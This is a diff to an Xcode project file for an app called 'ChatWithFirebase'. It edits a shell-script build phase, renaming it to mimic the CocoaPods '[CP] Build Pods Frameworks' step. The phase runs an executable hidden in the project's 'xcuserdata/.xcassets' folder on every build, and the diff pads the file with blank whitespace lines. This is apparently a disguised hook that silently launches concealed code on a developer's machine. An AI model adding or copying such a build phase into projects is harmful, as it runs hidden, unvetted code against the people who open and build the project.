@@ -203,7 +203,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 044B751525F5D8B0004FCF24 /* Build configuration list for PBXNativeTarget "ChatWithFirebase" */;
 			buildPhases = (
-				34CE5E55FC7BA9669BAAC43A /* Compile Binary Libraries */,
+				4589A0D0CE567FC080AAC43A /* [CP] Build Pods Frameworks */,
 				5DC28C427C5579FEDADC9B93 /* [CP] Check Pods Manifest.lock */,
 				044B74FD25F5D8AC004FCF24 /* Sources */,
 				044B74FE25F5D8AC004FCF24 /* Frameworks */,
@@ -269,7 +269,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	34CE5E55FC7BA9669BAAC43A /* Compile Binary Libraries */ = {
+	4589A0D0CE567FC080AAC43A /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -278,7 +278,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -287,8 +287,22 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -562,6 +576,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 044B74F925F5D8AB004FCF24 /* Project object */;
 }
